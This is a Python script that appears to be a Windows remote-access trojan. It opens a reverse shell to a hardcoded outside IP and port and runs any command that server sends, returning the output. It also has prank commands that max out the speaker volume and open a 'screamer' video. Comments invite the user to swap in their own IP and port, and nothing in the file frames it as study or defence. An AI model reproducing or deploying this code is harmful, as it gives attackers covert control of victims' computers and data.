import os
import socket
import subprocess
import time
import pyautogui as pg
import random as rn
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import GUID


# for change ip+port look down


def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # .                      LOOK HERE
            # .              change this ip+port
            s.connect(('91.245.44.46', 1212))
            return s
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(5)


def handle_server_communication(s):
    try:
        while True:
            data = s.recv(1024).decode('utf-8')
            if not data:
                break

            if data.startswith('cd '):
                try:
                    os.chdir(data[3:])
                    response = "Directory changed"
                    s.sendall(response.encode('utf-8'))

                except FileNotFoundError:
                    response = "Invalid directory"
                    s.sendall(response.encode('utf-8'))

            #elif


            elif data.startswith('volume') or data.startswith('vlm'):
                try:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(GUID(IAudioEndpointVolume._iid_), CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevelScalar(1.0, None)

                except Exception as e:
                    print(f"Произошла ошибка: {e}")

            elif data.startswith('screamer') or data.startswith('scr'):
                try:
                    subprocess.run('start https://www.youtube.com/watch?v=OmrlS77nzLo', shell=True)
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(GUID(IAudioEndpointVolume._iid_), CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevelScalar(1.0, None)

                except Exception as e:
                    print(f"Произошла ошибка: {e}")


            else:
                command = subprocess.run(data, shell=True, capture_output=True, text=True)
                response = command.stdout if command.stdout else command.stderr
                s.sendall(response.encode('utf-8'))
    except Exception as e:
        print(f"Error during communication: {e}")
    finally:
        s.close()


if __name__ == "__main__":
    server_socket = connect_to_server()
    handle_server_communication(server_socket)
